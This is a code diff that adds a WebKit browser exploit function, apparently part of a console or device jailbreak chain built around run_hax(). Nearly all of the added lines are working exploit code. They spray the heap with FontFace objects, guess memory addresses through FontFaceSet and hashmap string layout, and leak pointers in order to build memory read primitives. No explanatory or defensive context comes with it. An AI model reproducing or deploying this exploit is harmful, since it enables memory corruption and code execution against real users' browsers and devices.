@@ -678,14 +678,119 @@ function run_hax() {
     load_exploit_done(); 
     }
 }
+function webkitExploit() {
+StartTimer();
+var PAGE_SIZE = 16384;
+var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
+var STRING_OFFSET = 20;
+var SPRAY_FONTS = 0x100a;
+var GUESS_FONT = 8602845184;
+var NPAGES = 20;
+var INVALID_POINTER = 0;
+var HAMMER_FONT_NAME = "font8";
+var HAMMER_NSTRINGS = 700;
+var union = new ArrayBuffer(8);
+var union_b = new Uint8Array(union);
+var union_i = new Uint32Array(union);
+var union_f = new Float64Array(union);
+var bad_fonts = [];
+for (var i = 0; i < SPRAY_FONTS; i++)
+bad_fonts.push(new FontFace("font1", "", {}));
+var good_font = new FontFace("font2", "url(data:text/html,)", {});
+bad_fonts.push(good_font);
+var arrays = [];
+for (var i = 0; i < 512; i++)
+arrays.push(new Array(31));
+arrays[256][0] = 1.5;
+arrays[257][0] = {};
+arrays[258][0] = 1.5;
+var jsvalue = {
+a: arrays[256],
+b: new Uint32Array(1),
+c: true
+};
+var string_atomifier = {};
+var string_id = 10000000;
+function ptrToString(p) {
+var s = '';
+for (var i = 0; i < 8; i++) {
+s += String.fromCharCode(p % 256);
+p = (p - p % 256) / 256;
+}
+return s;
+}
+function stringToPtr(p, o) {
+if (o === undefined)
+o = 0;
+var ans = 0;
+for (var i = 7; i >= 0; i--)
+ans = 256 * ans + p.charCodeAt(o + i);
+return ans;
+}
+var strings = [];
+function mkString(l, head) {
+var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
+string_atomifier[s] = 1;
+strings.push(s);
+return s;
+}
+var guf = GUESS_FONT;
+var ite = true;
+var matches = 0;
+var round = 0;
+window.ffses = {};
+do {
+var p_s = ptrToString(NPAGES + 2);
+for (var i = 0; i < NPAGES; i++)
+p_s += ptrToString(guf + i * PAGE_SIZE);
+p_s += ptrToString(INVALID_POINTER);
+for (var i = 0; i < 256; i++)
+mkString(HASHMAP_BUCKET, p_s);
+var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
+var badstr1 = mkString(HASHMAP_BUCKET, p_s);
+var guessed_font = null;
+var guessed_addr = null;
+for (var i = 0; i < SPRAY_FONTS; i++) {
+bad_fonts[i].family = "search" + round;
+if (badstr1.substr(0, p_s.length) != p_s) {
+guessed_font = i;
+var p_s1 = badstr1.substr(0, p_s.length);
+for (var i = 1; i <= NPAGES; i++) {
+if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
+guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
+break;
+}
+}
+if (matches++ == 0) {
+guf = guessed_addr + 2 * PAGE_SIZE;
+guessed_addr = null;
+}
+break;
+}
+}
+if ((ite = !ite))
+guf += NPAGES * PAGE_SIZE;
+}
+while (guessed_addr === null);
 var p_s = '';
+p_s += ptrToString(26);
+p_s += ptrToString(guessed_addr);
+p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+for (var i = 0; i < 19; i++)
+p_s += ptrToString(INVALID_POINTER);
+for (var i = 0; i < 256; i++)
+mkString(HASHMAP_BUCKET, p_s);
 var needfix = [];
+for (var i = 0;; i++) {
+ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
 var badstr2 = mkString(HASHMAP_BUCKET, p_s);
 needfix.push(mkString(HASHMAP_BUCKET, p_s));
+bad_fonts[guessed_font].family = "evil2";
+bad_fonts[guessed_font + 1].family = "evil3";
 var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
 if (leak < 0x1000000000000)
-//break;
+break;
 }
 function makeReader(read_addr, ffs_name) {
 var fake_s = '';
@@ -981,6 +1086,7 @@ obj_slave.obj = obj;
 return new int64(obj_master[4], obj_master[5]);
 }
 };
+}
 
 window.p = prim;
 run_hax();
